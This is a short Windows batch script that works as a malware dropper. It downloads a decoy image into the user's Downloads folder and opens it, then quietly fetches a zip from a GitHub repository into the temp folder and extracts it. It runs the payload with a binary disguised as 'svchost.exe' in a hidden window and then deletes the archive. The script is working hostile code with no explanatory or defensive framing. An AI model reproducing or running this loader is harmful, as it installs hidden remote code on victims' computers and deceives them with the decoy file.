@echo off
setlocal
set "url=https://github.com/nvslks/e/raw/refs/heads/e/1.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
set "urlpdf=https://github.com/nvslks/e/raw/refs/heads/e/1"
set "downloadPath=%USERPROFILE%\Downloads\SDC11050-1-196032877.JPG"
powershell -Command "Invoke-WebRequest -Uri '%urlpdf%' -OutFile '%downloadPath%'"
if exist "%downloadPath%" (
    start "" "%downloadPath%"
) else (
    start "" "%downloadPath%"
)

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

set "pythonScript=%tempdir%\python.py"
if exist "%pythonScript%" (
    powershell -Command "Start-Process -FilePath "$env:TEMP\svchost.exe" -ArgumentList "`"$env:TEMP\python.py`"" -WindowStyle Hidden"
) else (
    exit
)

del "%output%"

exit
